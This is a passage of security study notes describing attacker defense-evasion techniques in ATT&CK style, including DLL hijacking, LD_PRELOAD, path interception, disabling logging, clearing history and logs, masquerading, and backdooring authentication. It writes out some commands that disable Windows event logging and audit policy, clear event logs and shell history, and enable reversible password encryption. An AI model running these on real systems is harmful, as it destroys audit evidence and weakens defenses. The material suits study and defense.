* **Note:** Resource forks have been deprecated and replaced with the application bundle structure; Non-localized resources are placed at the top level directory of an application bundle, while localized resources are placed in the /Resources folder

Adversaries can use resource forks to hide malicious data that may otherwise be stored directly in files. Adversaries can execute content with an attached resource fork, at a specified offset, that is moved to an executable location then invoked. Resource fork content may also be obfuscated/encrypted until execution.

<br>

## Process Argument Spoofing
Process command-line arguments are stored in the process environment block (PEB), a data structure used by Windows to store various information about/used by a process. The PEB includes the process command-line arguments that are referenced when executing the process. When a process is created, defensive tools/sensors that monitor process creations may retrieve the process arguments from the PEB

**Process Hollowing** can be abused to spawn a process in a suspended state with benign arguments
* After the process is spawned and the PEB is initialized (and process information is potentially logged by tools/sensors), adversaries may override the PEB to modify the command-line arguments (ex: using the Native API `WriteProcessMemory()` function) then resume process execution with malicious arguments

Adversaries may also execute a process with malicious command-line arguments then patch the memory with benign arguments that may bypass subsequent process memory analysis
* This behavior may also be combined with other tricks (such as Parent PID Spoofing) to manipulate or further evade process-based detections

<br>
<hr>

# Hijack Execution Flow
Hijacking execution flow can be for the purposes of persistence, since this hijacked execution may reoccur over time
* Adversaries may also use these mechanisms to elevate privileges or evade defenses, such as application control or other restrictions on execution

There are many ways an adversary may hijack the flow of execution, including by manipulating how the OS locates programs to be executed
* How the OS locates libraries to be used by a program can also be intercepted
* Locations where the OS looks for programs/resources, such as file directories and in the case of Windows the Registry, could also be poisoned to include malicious payloads

<br>

## DLL Search Order Hijacking 
Windows systems use a common method to look for required DLLs to load into a program.
Hijacking DLL loads may be for the purpose of establishing persistence as well as elevating privileges and/or evading restrictions on file execution.

### Hijacking DLL loads
* Planting trojan DLLs in a directory that will be searched before the location of a legitimate library that will be requested by a program, causing Windows to load their malicious library when it is called for by the victim program

* Binary planting attacks -- Placing a malicious DLL with the same name as an ambiguously specified DLL in a location that Windows searches before the legitimate DLL
  * Often this location is the current working directory of the program
  * Remote DLL preloading attacks occur when a program sets its current directory to a remote location such as a Web share before loading a DLL
  

* Directly modify the search order via DLL redirection, which after being enabled (in the Registry and creation of a redirection file) may cause a program to load a different DLL

* If a search order-vulnerable program is configured to run at a higher privilege level, then the adversary-controlled DLL that is loaded will also be executed at the higher level
  * This technique could be used for privilege escalation from user to administrator or SYSTEM or from administrator to SYSTEM, depending on the program

<br>

## DLL Side-Loading
DLL side-loading involves hijacking which DLL a program loads. But rather than just planting the DLL within the search order, adversaries may directly side-load their payloads by planting then invoking a legitimate application that executes their payload

Side-loading takes advantage of the DLL search order used by the loader by positioning both the victim application and malicious payload(s) alongside each other. 
* Benign executables used to side-load payloads may not be flagged during delivery and/or execution
* Adversary payloads may also be encrypted/packed or otherwise obfuscated until loaded into the memory of the trusted process

<br>

## Dylib Hijacking
Adversaries may execute their own payloads by placing a malicious dynamic library (dylib) with an expected name in a path a victim application searches at runtime. The dynamic loader will try to find the dylibs based on the sequential order of the search paths.
* Paths to dylibs may be prefixed with `@rpath`, which allows developers to use relative paths to specify an array of search paths used at runtime based on the location of the executable
* Additionally, if weak linking is used, such as the `LC_LOAD_WEAK_DYLIB` function, an application will still execute even if an expected dylib is not present
* Weak linking enables developers to run an application on multiple macOS versions as new APIs are added

Adversaries may gain execution by inserting malicious dylibs with the name of the missing dylib in the identified path
* Dylibs are loaded into an application's address space allowing the malicious dylib to inherit the application's privilege level and resources
* Based on the application, this could result in privilege escalation and uninhibited network access
  * This method may also evade detection from security products since the execution is masked under a legitimate process

<br>

## Executable Installer File Permissions Weakness
Installers processes may automatically execute specific binaries as part of their functionality or to perform other actions
* If the permissions on the file system directory containing a target binary, or permissions on the binary itself, are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process
  * If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions

Another variation of this technique can be performed by taking advantage of a weakness that is common in executable, self-extracting installers
* During the installation process, it is common for installers to use a subdirectory within the `%TEMP%` directory to unpack binaries such as DLLs, EXEs, or other payloads
* When installers create subdirectories and files they often do not set appropriate permissions to restrict write access, which allows for execution of untrusted code placed in the subdirectories or overwriting of binaries used in the installation process
  * This behavior is related to and may take advantage of DLL Search Order Hijacking.

Adversaries may use this technique to replace legitimate binaries with malicious ones as a means of executing code at a higher permissions level
* Some installers may require elevated privileges that will result in privilege escalation when executing adversary controlled code
  * This behavior is related to Bypass User Account Control
  * If the executing process is set to run at a specific time or during a certain event then this technique can also be used for persistence

<br>

## Dynamic Linker Hijacking
During the execution preparation phase of a program, the dynamic linker loads specified absolute paths of shared libraries from environment variables and files, such as `LD_PRELOAD` on Linux or `DYLD_INSERT_LIBRARIES` on macOS
* Libraries specified in environment variables are loaded first, taking precedence over system libraries with the same function name
* These variables are often used by developers to debug binaries without needing to recompile, deconflict mapped symbols, and implement custom functions without changing the original library

### Linux and macOS
Hijacking dynamic linker variables grants access to the victim process's memory, system/network resources, and possibly elevated privileges
* This method may evade detection from security products since the execution is masked under a legitimate process
  * Adversaries can set environment variables via CLI using the *export*, *setenv* function, or *putenv* function
  * Adversaries can also leverage Dynamic Linker Hijacking to export variables in a shell or set variables programmatically using higher level syntax such Python’s *os.environ*

### Linux
Set *LD_PRELOAD* to point to malicious libraries that match the name of legitimate libraries which are requested by a victim program, causing the OS to load the adversary's malicious code upon execution of the victim program
* *LD_PRELOAD* can be set via the `environment variable` or `/etc/ld.so.preload` file
  * Libraries specified by *LD_PRELOAD* are loaded and mapped into memory by *dlopen()* and *mmap()* 

### macOS
Set the `DYLD_INSERT_LIBRARIES` environment variable to point to malicious libraries containing names of legitimate libraries or functions requested by a victim program

<br>

## Path Interception by PATH Environment Variable
The *PATH* environment variable contains a list of directories. Certain methods of executing a program rely solely on the PATH environment variable to determine the locations that are searched for a program when the path for the program is not given
  
If any directories are listed in the PATH environment variable before the Windows directory, `%SystemRoot%\system32`, a program may be placed in the preceding directory that is named the same as a Windows program, which will be executed when that command is executed from a script or CLI

<br>

## Path Interception by Search Order Hijacking
**Search order hijacking:** Occurs when an adversary abuses the order in which Windows searches for programs that are not given a path. Unlike DLL Search Order Hijacking, the search order differs depending on the method that is used to execute the program
* **Note:** It's common for Windows to search in the directory of the initiating program before searching through the Windows system directory

Adversaries may execute their own malicious payloads by hijacking the search order used to load other programs. Because some programs do not call other programs using the full path, adversaries may place their own file in the directory where the calling program is located, causing the OS to launch their malicious software at the request of the calling program.

* Place a program called "net.exe" within the same directory as example.exe, "net.exe" will be run instead of the Windows system utility net
* In addition, if an adversary places a program called "net.com" in the same directory as "net.exe", then cmd.exe /C net user will execute "net.com" instead of "net.exe" due to the order of executable extensions defined under PATHEXT

<br>

## Path Interception by Unquoted Path
Adversaries can take advantage of paths that lack surrounding quotations by placing an executable in a higher level directory within the path, so that Windows will choose the adversary's executable to launch

Service paths and shortcut paths may also be vulnerable to path interception if the path has one or more spaces and is not surrounded by quotation marks (`C:\unsafe path \program.exe` vs. `"C:\safe path \program.exe"`) Stored in Windows Registry keys 

Attackers can place an executable in a higher level directory of the path, and Windows will resolve that executable instead of the intended executable.
* If the path in a shortcut is `C:\program files\myapp.exe`, create a program at `C:\program.exe` that will be run instead of the intended program

<br>

## Services File Permissions Weakness
Adversaries may use flaws in the permissions of Windows services to replace the binary that is executed upon service start
* If the permissions on the file system directory containing a target binary, or permissions on the binary itself are improperly set, then the target binary may be overwritten with another binary using user-level permissions and executed by the original process
* If the original process and thread are running under a higher permissions level, then the replaced binary will also execute under higher-level permissions

<br>

## Services Registry Permissions Weakness
Adversaries may use flaws in the permissions for Registry keys related to services to redirect from the originally specified executable to one that they control, in order to launch their own code when a service starts

Windows stores local service configuration information in the Registry under `HKLM\SYSTEM\CurrentControlSet\Services`
* The information stored under a service's Registry keys can be manipulated to modify a service's execution parameters through tools such as the service controller, sc.exe, PowerShell, or Reg


Access to Registry keys is controlled through access control lists and user permissions
* If the permissions for users and groups are not properly set and allow access to the Registry keys for a service, adversaries may change the service's `binPath/ImagePath` to point to a different executable under their control

Adversaries may also alter other Registry keys in the service’s Registry tree
* The *FailureCommand* key may be changed so that the service is executed in an elevated context anytime the service fails or is intentionally corrupted

The *Performance* key contains the name of a driver service's performance DLL and the names of several exported functions in the DLL
* If the Performance key is not already present and if an adversary-controlled user has the *Create Subkey* permission, adversaries may create the Performance key in the service’s Registry tree to point to a malicious DLL

Adversaries may also add the *Parameters* key, which stores driver-specific data, or other custom subkeys for their malicious services to establish persistence or enable other malicious activities
* Additionally, If adversaries launch their malicious services using svchost.exe, the service’s file may be identified using `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Services\servicename\Parameters\ServiceDll`

<br>

## COR_PROFILER
**COR_PROFILER:** A .NET Framework feature which allows developers to specify an unmanaged (or external of .NET) profiling DLL to be loaded into each .NET process that loads the Common Language Runtime (CLR). These profilers are designed to monitor, troubleshoot, and debug managed code executed by the .NET CLR.

The COR_PROFILER environment variable can be set at various scopes (system, user, or process) resulting in different levels of influence
* System and user-wide environment variable scopes are specified in the Registry, where a Component Object Model (COM) object can be registered as a profiler DLL
* A process scope COR_PROFILER can also be created in-memory without modifying the Registry
* Starting with .NET Framework 4, the profiling DLL does not need to be registered as long as the location of the DLL is specified in the COR_PROFILER_PATH environment variable.

Adversaries may abuse COR_PROFILER to establish persistence that executes a malicious DLL in the context of all .NET processes every time the CLR is invoked

The COR_PROFILER can also be used to elevate privileges (ex: Bypass User Account Control) if the victim .NET process executes at a higher permission level, as well as to hook and Impair Defenses provided by .NET processes

<br>

## KernelCallbackTable
**KernelCallbackTable:** Can be found in the Process Environment Block (PEB) and is initialized to an array of graphic functions available to a GUI process once user32.dll is loaded

Attackers may hijack the execution flow of a process using the *KernelCallbackTable* by replacing an original callback function with a malicious payload
* Modifying callback functions can be achieved in various ways involving related behaviors such as Reflective Code Loading or Process Injection into another process

A pointer to the memory address of the *KernelCallbackTable* can be obtained by locating the PEB (ex: via a call to the *NtQueryInformationProcess()* Native API function)
* Once the pointer is located, the *KernelCallbackTable* can be duplicated, and a function in the table (e.g., fnCOPYDATA) set to the address of a malicious payload (ex: via WriteProcessMemory())
* The PEB is then updated with the new address of the table -- Once the tampered function is invoked, the malicious payload will be triggered

The tampered function is typically invoked using a Windows message. After the process is hijacked and malicious code is executed, the KernelCallbackTable may also be restored to its original state by the rest of the malicious payload
* Use of the *KernelCallbackTable* to hijack execution flow may evade detection from security products since the execution can be masked under a legitimate process

<br>
<hr>

# Impair Defenses
Adversaries may maliciously modify components of a victim environment in order to hinder or disable defensive mechanisms. This not only involves impairing preventative defenses, such as firewalls and AV solutions, but also detection capabilities that defenders can use to audit activity and identify malicious behavior. This may also span both native defenses as well as supplemental capabilities installed by users and administrators.

Adversaries could also target event aggregation and analysis mechanisms, or otherwise disrupt these procedures by altering other system components.

<br>

## Disable or Modify Tools
Adversaries may modify and/or disable security tools to avoid possible detection of their malware/tools and activities
* Killing security software processes or services
* Modifying / deleting Registry keys or configuration files so that tools do not operate properly
* Other methods to interfere with security tools scanning or reporting information

Adversaries may also tamper with artifacts deployed and utilized by security tools. Security tools may make dynamic changes to system components in order to maintain visibility into specific events
* Security products may load their own modules and/or modify those loaded by processes to facilitate data collection
* Similar to Indicator Blocking, adversaries may unhook or otherwise modify these features added by tools (especially those that exist in userland or are otherwise potentially accessible to adversaries) to avoid detection

<br>

## Disable Windows Event Logging
Windows event logs record user and system activity such as login attempts, process creation, etc.. This data is used by security tools and analysts to generate detections


**EventLog** service: Maintains event logs from various system components and applications
* By default, the service automatically starts when a system powers on
  * An audit policy, maintained by the Local Security Policy (secpol.msc), defines which system events the EventLog service logs
  * Security audit policy settings can be changed by running secpol.msc, then navigating to `Security Settings\Local Policies\Audit Policy` for basic audit policy settings or `Security Settings\Advanced Audit Policy Configuration` for advanced audit policy settings
    * `auditpol.exe` may also be used to set audit policies

Adversaries may disable Windows event logging to limit data that can be leveraged for detections and audits


Adversaries may target system-wide logging or just that of a particular application
* The EventLog service may be disabled using the following PowerShell line: `Stop-Service -Name EventLog`
* Additionally, adversaries may use **auditpol** and its sub-commands in a command prompt to disable auditing or clear the audit policy
  * Enable or disable a specified setting or audit category: `/success` or `/failure` parameters
  * Turns off auditing for the Account Logon category: `auditpol /set /category:"Account Logon" /success:disable /failure:disable`
  * To clear the audit policy: `auditpol /clear /y or auditpol /remove /allusers`

By disabling Windows event logging, adversaries can operate while leaving less evidence of a compromise behind

<br>

## Impair Command History Logging
Adversaries may impair command history logging to hide commands they run on a compromised system. Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.

### UNIX
`history` command is tracked in a file pointed to by the environment variable *HISTFILE*. When a user logs off a system, this information is flushed to a file in the user's home directory called `~/.bash_history`
* The **HISTCONTROL** environment variable keeps track of what should be saved by the history command and eventually into the `~/.bash_history` file when a user logs out
  * HISTCONTROL does not exist by default on macOS, but can be set by the user and will be respected

Adversaries may clear the history environment variable (unset HISTFILE) or set the command history size to zero (export HISTFILESIZE=0) to prevent logging of commands
* HISTCONTROL can be configured to ignore commands that start with a space by simply setting it to "ignorespace"
* HISTCONTROL can also be set to ignore duplicate commands by setting it to "ignoredups"
  * In some Linux systems, this is set by default to "ignoreboth" which covers both of the previous examples -- This means that " ls" will not be saved, but "ls" would be saved by history
* Adversaries can abuse this to operate without leaving traces by simply prepending a space to all of their terminal commands

### Windows
The **PSReadLine** module tracks commands used in all PowerShell sessions and writes them to a file (`$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` by default). Adversaries may change where these logs are saved using `Set-PSReadLineOption -HistorySavePath {File Path}`
* This will cause **ConsoleHost_history.txt** to stop receiving logs
* It is possible to turn off logging to this file using the PowerShell command `Set-PSReadlineOption -HistorySaveStyle SaveNothing`

Adversaries may also leverage a Network Device CLI on network devices to disable historical command logging.

<br>

## Disable or Modify System Firewall
Adversaries may disable or modify system firewalls in order to bypass controls limiting network usage. Changes could be disabling the entire mechanism as well as adding, deleting, or modifying particular rules. This can be done numerous ways depending on the OS, including via command-line, editing Windows Registry keys, and Windows Control Panel.

Modifying or disabling a system firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed

<br>

## Indicator Blocking
An adversary may attempt to block indicators or events typically captured by sensors from being gathered and analyzed. This could include maliciously redirecting or even disabling host-based sensors, such as Event Tracing for Windows (ETW),by tampering settings that control the collection and flow of event telemetry
* These settings may be stored on the system in configuration files and/or in the Registry as well as being accessible via administrative utilities such as PowerShell or Windows Management Instrumentation

ETW interruption can be achieved multiple ways, however most directly by defining conditions using the PowerShell `Set-EtwTraceProvider` cmdlet or by interfacing directly with the Registry to make alterations

In the case of network-based reporting of indicators, an adversary may block traffic associated with reporting to prevent central analysis
* This may be accomplished by many means, such as stopping a local process responsible for forwarding telemetry and/or creating a host-based firewall rule to block traffic to specific hosts responsible for aggregating events.

<br>

## Disable or Modify Cloud Firewall
Adversaries may disable or modify a firewall within a cloud environment to bypass controls that limit access to cloud resources. Cloud firewalls are separate from system firewalls that are described in Disable or Modify System Firewall.

Cloud environments typically utilize restrictive security groups and firewall rules that only allow network activity from trusted IP addresses via expected ports and protocols. An adversary may introduce new firewall rules or policies to allow access into a victim cloud environment. For example, an adversary may use a script or utility that creates new ingress rules in existing security groups to allow any TCP/IP connectivity.

Modifying or disabling a cloud firewall may enable adversary C2 communications, lateral movement, and/or data exfiltration that would otherwise not be allowed.

<br>

## Disable Cloud Logs
An adversary may disable cloud logging capabilities and integrations to limit what data is collected on their activities and avoid detection.

Cloud environments allow for collection and analysis of audit and application logs that provide insight into what activities a user does within the environment. If an adversary has sufficient permissions, they can disable logging to avoid detection of their activities
* In AWS an adversary may disable CloudWatch/CloudTrail integrations prior to conducting further malicious activity

<br>

## Safe Mode Boot
Safe mode starts up the Windows OS with a limited set of drivers and services. Third-party security software such as EDR tools may not start after booting Windows in safe mode. There are two versions of safe mode: Safe Mode and Safe Mode with Networking. It is possible to start additional services after a safe mode boot

Adversaries may abuse safe mode to disable endpoint defenses that may not start with a limited boot
* Hosts can be forced into safe mode after the next reboot via modifications to Boot Configuration Data (BCD) stores, which are files that manage boot application settings

* Adversaries may also add their malicious applications to the list of minimal services that start in safe mode by modifying relevant Registry values
* Malicious Component Object Model (COM) objects may also be registered and loaded in safe mode

<br>

## Downgrade Attack
Adversaries may downgrade or use a version of system features that may be outdated, vulnerable, and/or does not support updated security controls such as logging
* PowerShell versions 5+ includes Script Block Logging (SBL) which can record executed script content; However, adversaries may attempt to execute a previous version of PowerShell that does not support SBL with the intent to Impair Defenses while running malicious scripts that may have otherwise been detected

Adversaries may downgrade and use less-secure versions of various features of a system, such as Command and Scripting Interpreters or even network protocols that can be abused to enable Adversary-in-the-Middle

<br>
<hr>

# Indicator Removal on Host
Adversaries may delete or modify artifacts generated on a host system to remove evidence of their presence or hinder defenses. Various artifacts may be created by an adversary or something that can be attributed to an adversary’s actions. Typically these artifacts are used as defensive indicators related to monitored events, such as strings from downloaded files, logs that are generated from user actions, and other data analyzed by defenders. Location, format, and type of artifact (such as command or login history) are often specific to each platform.

Removal of these indicators may interfere with event collection, reporting, or other processes used to detect intrusion activity. This may compromise the integrity of security solutions by causing notable events to go unreported. This activity may also impede forensic analysis and incident response, due to lack of sufficient data to determine what occurred.

<br>

## Clear Windows Event Logs
**Windows Event Logs** are a record of a computer's alerts and notifications. There are three system-defined sources of events: System, Application, and Security, with five event types: Error, Warning, Information, Success Audit, and Failure Audit.
Adversaries may clear Windows Event Logs to hide the activity of an intrusion.

The event logs can be cleared with the following utility commands:

* `wevtutil cl system`
* `wevtutil cl application`
* `wevtutil cl security`
**Note:** These logs may also be cleared through other mechanisms, such as the event viewer GUI or PowerShell

<br>

## Clear Linux or Mac System Logs
macOS and Linux both keep track of system or user-initiated actions via system logs. The majority of native system logging is stored under the `/var/log/ directory`
* Subfolders in this directory categorize logs by their related functions, such as:

* `/var/log/messages`: General and system-related messages
* `/var/log/secure or /var/log/auth.log`: Authentication logs
* `/var/log/utmp` or `/var/log/wtmp`: Login records
* `/var/log/kern.log`: Kernel logs
* `/var/log/cron.log`: Crond logs
* `/var/log/maillog`: Mail server logs
* `/var/log/httpd/`: Web server access and error logs

<br>

## Clear Command History
Various command interpreters keep track of the commands users type in their terminal so that users can retrace what they've done.

### UNIX
These command histories can be accessed in a few different ways
* While logged in, this command history is tracked in a file pointed to by the environment variable `HISTFILE`
* When a user logs off a system, this information is flushed to a file in the user's home directory called `~/.bash_history`

* Clear the history: `history -c`
* Delete the bash history file: `rm ~/.bash_history`
* Adversaries may also leverage a Network Device CLI on network devices to clear command history data

### Windows
PowerShell has two different command history providers: the built-in history and the command history managed by the `PSReadLine` module
* The built-in history only tracks the commands used in the current session
  * This command history is not available to other sessions and is deleted when the session ends

* The *PSReadLine* command history tracks the commands used in all PowerShell sessions and writes them to a file (`$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt` by default)
  * This history file is available to all sessions and contains all past history since the file is not deleted when the session ends

### Attack
Adversaries may run the PowerShell command `Clear-History` to flush the entire command history from a current PowerShell session
* **Note:** This will not delete/flush the `ConsoleHost_history.txt` file
  * Adversaries may also delete the `ConsoleHost_history.txt` file or edit its contents to hide PowerShell commands they have run

<br>

## File Deletion
Malware, tools, or other non-native files dropped or created on a system by an adversary may leave traces to indicate to what was done within a network and how
* Removal of these files can occur during an intrusion, or as part of a post-intrusion process to minimize the adversary's footprint

There are tools available from the host OS to perform cleanup, but adversaries may use other tools as well
* Examples of built-in Command and Scripting Interpreter functions include `del` on Windows and `rm` or `unlink` on UNIX

<br>

## Network Share Connection Removal
Windows shared drive and SMB/Windows Admin Shares connections can be removed when no longer needed
* `net use \system\share /delete`: Remove network share connections
* Adversaries may remove share connections that are no longer useful in order to clean up traces of their operation

<br>

## Timestomp
**Timestomping:** A technique that modifies the timestamps of a file often to mimic files that are in the same folder
* This can be done on files that have been modified or created by the adversary so that they do not appear conspicuous to forensic investigators or file analysis tools
* Adversaries may modify file time attributes to hide new or changes to existing files
* Timestomping may be used along with file name Masquerading to hide malware and tools

<br>
<hr>

# Indirect Command Execution
Various Windows utilities may be used to execute commands, possibly without invoking cmd
* *Forfiles*, the Program Compatibility Assistant (pcalua.exe), components of the Windows Subsystem for Linux (WSL), as well as other utilities may invoke the execution of programs and commands from a Command and Scripting Interpreter, Run window, or via scripts
Adversaries may abuse utilities that allow for command execution to bypass security restrictions that limit the use of command-line interpreters

Adversaries may abuse these features for Defense Evasion, specifically to perform arbitrary execution while subverting detections and/or mitigation controls (such as Group Policy) that limit/prevent the usage of cmd or file extensions more commonly associated with malicious payloads

<br>
<hr>

# Masquerading
**Masquerading** Occurs when the name or location of an object, legitimate or malicious, is manipulated or abused for the sake of evading defenses and observation
* This may include manipulating file metadata, tricking users into misidentifying the file type, and giving legitimate task or service names
  
Adversaries may attempt to manipulate features of their artifacts to make them appear legitimate or benign to users and/or security tools
* Renaming abusable system utilities to evade security monitoring is also a form of Masquerading

<br>

## Invalid Code Signature
**Code Signing:** Provides a level of authenticity on a binary from the developer and a guarantee that the binary has not been tampered with. Adversaries can copy the metadata and signature information from a signed program, then use it as a template for an unsigned program
* Files with invalid code signatures will fail digital signature validation checks, but they may appear more legitimate to users and security tools may improperly handle these files

<br>

## Right-to-Left Override
**RTLO:** A non-printing Unicode character that causes the text that follows it to be displayed in reverse
* A Windows screensaver executable named `March 25 \u202Excod.scr` will display as `March 25 rcs.docx`
* A JavaScript file named `photo_high_re\u202Egnp.js` will be displayed as `photo_high_resj.png`

Adversaries may abuse the right-to-left override (RTLO or RLO) character (`U+202E`) to disguise a string and/or file name to make it appear benign
* Adversaries may abuse the RTLO character as a means of tricking a user into executing what they think is a benign file type
  * **Note:** This technique is commonly used w/ Spearphishing Attachment/Malicious File since it can trick both end users and defenders if they are not aware of how their tools display and render the RTLO character
* RTLO can be used in the Windows Registry as well, where regedit.exe displays the reversed characters but the command line tool reg.exe does not by default

<br>

## Rename System Utilities
Security monitoring and control mechanisms may be in place for system utilities adversaries are capable of abusing
* It may be possible to bypass those security mechanisms by renaming the utility prior to utilization
* An alternative case occurs when a legitimate utility is copied or moved to a different directory and renamed to avoid detections based on system utilities executing from non-standard paths

<br>

## Masquerade Task or Service
Tasks/services executed by the Task Scheduler or systemd will typically be given a name and/or description
* Windows services will have a service name as well as a display name
  * Many benign tasks and services exist that have commonly associated names
* Adversaries may give tasks or services names that are similar or identical to those of legitimate ones
  * Tasks or services contain other fields, such as a description, that adversaries may attempt to make appear legitimate.[3][4]

<br>

## Match Legitimate Name or Location
Adversaries may match or approximate the name or location of legitimate files or resources when naming/placing them. This is done for the sake of evading defenses and observation
* This may be done by placing an executable in a commonly trusted directory (ex: under System32) or giving it the name of a legitimate, trusted program (ex: svchost.exe)
* In containerized environments, this may also be done by creating a resource in a namespace that matches the naming convention of a container pod or cluster
* Alternatively, a file or container image name given may be a close approximation to legitimate programs/images or something innocuous
* Adversaries may also use the same icon of the file they are trying to mimic

<br>

## Space after Filename
With certain file types (specifically this does not work with .app extensions), appending a space to the end of a filename will change how the file is processed by the OS
* If an executable called `evil.bin`, is clicked, it will launch Terminal.app and execute
* If thefile is renamed to `evil.txt`, it will launch with the default text editing application (not executing the binary)
  * **Note:** If the file is renamed to `evil.txt `(Space at the end), then the true file type is determined by the OS and handled appropriately and the binary will be executed
      * Adversaries can use this feature to trick users into clicking benign-looking files of any format and ultimately executing something malicious

<br>

## Double File Extension
A file name may include a secondary file type extension that may cause only the first extension to be displayed
* `File.txt.exe` may render in some views as just `File.txt`
  * The second extension is the true file type that determines how the file is opened and executed
  * The real file extension may be hidden by the OS
 in the file browser as well as in any software configured using or similar to the system’s policies

Adversaries may abuse double extensions to attempt to conceal dangerous file types of payloads. A very common usage involves tricking a user into opening what they think is a benign file type but is actually executable code
* Such files often pose as email attachments and allow an adversary to gain Initial Access into a user’s system via Spearphishing Attachment then User Execution
  * An executable file attachment named `Evil.txt.exe` may display as `Evil.txt` to a user
  * The user may then view it as a benign text file and open it, inadvertently executing the hidden malware

Common file types, such as text files (`.txt, .doc, etc.`) and image files (`.jpg, .gif, etc.`) are typically used as the first extension to appear benign
* Executable extensions commonly regarded as dangerous, such as `.exe, .lnk, .hta, and .scr`, often appear as the second extension and true file type

<br>
<hr>

# Modify Authentication Process
The authentication process is handled by mechanisms, such as the Local Security Authentication Server (LSASS) process and the Security Accounts Manager (SAM) on Windows, pluggable authentication modules (PAM) on Unix-based systems, and authorization plugins on MacOS systems, responsible for gathering, storing, and validating credentials
* By modifying an authentication process, an adversary may be able to authenticate to a service or system without using Valid Accounts

Adversaries may modify authentication mechanisms and processes to access user credentials or enable otherwise unwarranted access to accounts
* Maliciously modify a part of this process to either reveal credentials or bypass authentication mechanisms
* Compromised credentials or access may be used to bypass access controls placed on various resources on systems within the network and may even be used for persistent access to remote systems and externally available services

<br>

## Domain Controller Authentication
Adversaries may patch the authentication process on a domain controller to bypass the typical authentication mechanisms and enable access to accounts

Malware may be used to inject false credentials into the authentication process on a domain controller with the intent of creating a backdoor used to access any user’s account and/or credentials (ex: Skeleton Key)
* **Skeleton Key** works through a patch on an enterprise domain controller authentication process (LSASS) with credentials that adversaries may use to bypass the standard authentication system
  * Once patched, an adversary can use the injected password to successfully authenticate as any domain user account (until the the skeleton key is erased from memory by a reboot of the domain controller)
  * Authenticated access may enable unfettered access to hosts and/or resources within single-factor authentication environments

<br>

## Password Filter DLL
**Windows Password Filters** are password policy enforcement mechanisms for both domain and local accounts
* Filters are implemented as DLLs containing a method to validate potential passwords against password policies, which can be positioned on local computers for local accounts and/or domain controllers for domain accounts
  * Before registering new passwords in the Security Accounts Manager (SAM), the Local Security Authority (LSA) requests validation from each registered filter
  * Any potential changes cannot take effect until every registered filter acknowledges validation


Adversaries can register malicious password filters to harvest credentials from local computers and/or entire domains
* To perform proper validation, filters must receive plain-text credentials from the LSA
* A malicious password filter would receive these plain-text credentials every time a password request is made

<br>

## Pluggable Authentication Modules
**PAM:** A modular system of configuration files, libraries, and executable files which guide authentication for many services
* The most common authentication module is `pam_unix.so`, which retrieves, sets, and verifies account authentication information in `/etc/passwd` and `/etc/shadow`

Adversaries may modify components of the PAM system to create backdoors
* PAM components, such as `pam_unix.so`, can be patched to accept arbitrary adversary supplied values as legitimate credentials

Malicious modifications to the PAM system may also be abused to steal credentials
* Adversaries may infect PAM resources with code to harvest user credentials, since the values exchanged with PAM components may be plain-text since PAM does not store passwords

<br>

## Network Device Authentication
Adversaries may use *Patch System Image* to hard code a password in the OS, thus bypassing of native authentication mechanisms for local accounts on network devices

**Modify System Image** may include implanted code to the OS for network devices to provide access for adversaries using a specific password
* The modification includes a specific password which is implanted in the OS image via the patch
* Upon authentication attempts, the inserted code will first check to see if the user input is the password
* If so, access is granted
  * Otherwise, the implanted code will pass the credentials on for verification of potentially valid credentials

<br>

## Reversible Encryption
An adversary may abuse Active Directory authentication encryption properties to gain access to credentials on Windows systems
* The `AllowReversiblePasswordEncryption` property specifies whether reversible password encryption for an account is enabled or disabled
  * By default this property is disabled (instead storing user credentials as the output of one-way hashing functions) and should not be enabled unless legacy or other software require it.

If the property is enabled and/or a user changes their password after it is enabled, an adversary may be able to obtain the plaintext of passwords created/changed after the property was enabled

**To decrypt the passwords, an adversary needs four components:**

1. Encrypted password (`G$RADIUSCHAP`) from the AD user-structure `userParameters`
2. 16 byte randomly-generated value (`G$RADIUSCHAPKEY`) also from `userParameters`
3. Global LSA secret (`G$MSRADIUSCHAPKEY`)
4. Static key hardcoded in the Remote Access Subauthentication DLL (RASSFM.DLL)

With this information, an adversary may be able to reproduce the encryption key and subsequently decrypt the encrypted password value

An adversary may set this property at various scopes through Local Group Policy Editor, user properties, Fine-Grained Password Policy (FGPP), or via the ActiveDirectory PowerShell module
* An adversary may implement and apply a FGPP to users or groups if the Domain Functional Level is set to "Windows Server 2008" or higher
* In PowerShell, an adversary may make associated changes to user settings using commands similar to `Set-ADUser -AllowReversiblePasswordEncryption $true`

<br>
<hr>

# Modify Cloud Compute Infrastructure
An adversary may attempt to modify a cloud account's compute service infrastructure to evade defenses. A modification to the compute service infrastructure can include the creation, deletion, or modification of one or more components such as compute instances, virtual machines, and snapshots.

Permissions gained from the modification of infrastructure components may bypass restrictions that prevent access to existing infrastructure. Modifying infrastructure components may also allow an adversary to evade detection and remove evidence of their presence

<br>

## Create Snapshot
**Snapshot:** A point-in-time copy of an existing cloud compute component such as a VM, virtual hard drive, or volume
* An adversary may leverage permissions to create a snapshot in order to bypass restrictions that prevent access to existing compute service infrastructure, unlike in Revert Cloud Instance where an adversary may revert to a snapshot to evade detection and remove evidence of their presence

* An adversary may create a snapshot or data backup within a cloud account to evade defenses
* An adversary may Create Cloud Instance, mount one or more created snapshots to that instance, and then apply a policy that allows the adversary access to the created instance, such as a firewall policy that allows them inbound and outbound SSH access

<br>

## Create Cloud Instance
An adversary may create a new instance or virtual machine (VM) within the compute service of a cloud account to evade defense
* Creating a new instance may allow an adversary to bypass firewall rules and permissions that exist on instances currently residing within an account
* An adversary may Create Snapshot of one or more volumes in an account, create a new instance, mount the snapshots, and then apply a less restrictive security policy to collect Data from Local System or for Remote Data Staging
* Creating a new instance may also allow an adversary to carry out malicious activity within an environment without affecting the execution of current running instances

<br>

## Delete Cloud Instance
An adversary may delete a cloud instance after they have performed malicious activities in an attempt to evade detection and remove evidence of their presence. Deleting an instance or virtual machine can remove valuable forensic artifacts and other evidence of suspicious behavior if the instance is not recoverable.

An adversary may also Create Cloud Instance and later terminate the instance after achieving their objectives

<br>

## Revert Cloud Instance
